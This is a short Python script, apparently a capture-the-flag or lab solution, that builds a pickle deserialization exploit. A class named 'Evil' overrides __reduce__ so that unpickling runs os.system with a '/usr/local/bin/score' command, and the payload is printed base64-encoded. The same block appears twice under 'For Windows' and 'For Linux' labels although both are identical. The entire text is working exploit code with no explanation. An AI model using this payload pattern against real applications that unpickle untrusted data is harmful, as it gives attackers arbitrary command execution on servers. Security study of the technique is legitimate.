#For Windows
import base64
import pickle, os

class Evil(object):
    def __reduce__(self):
        return (os.system,("/usr/local/bin/score 35516971-8b06-4d5b-bbbe-2d825ed1ee0a",))

e = Evil()
print(base64.b64encode(pickle.dumps(e,2)))

# For Linux
import base64
import pickle, os

class Evil(object):
    def __reduce__(self):
        return (os.system,("/usr/local/bin/score 35516971-8b06-4d5b-bbbe-2d825ed1ee0a",))

e = Evil()
print(base64.b64encode(pickle.dumps(e,2)))
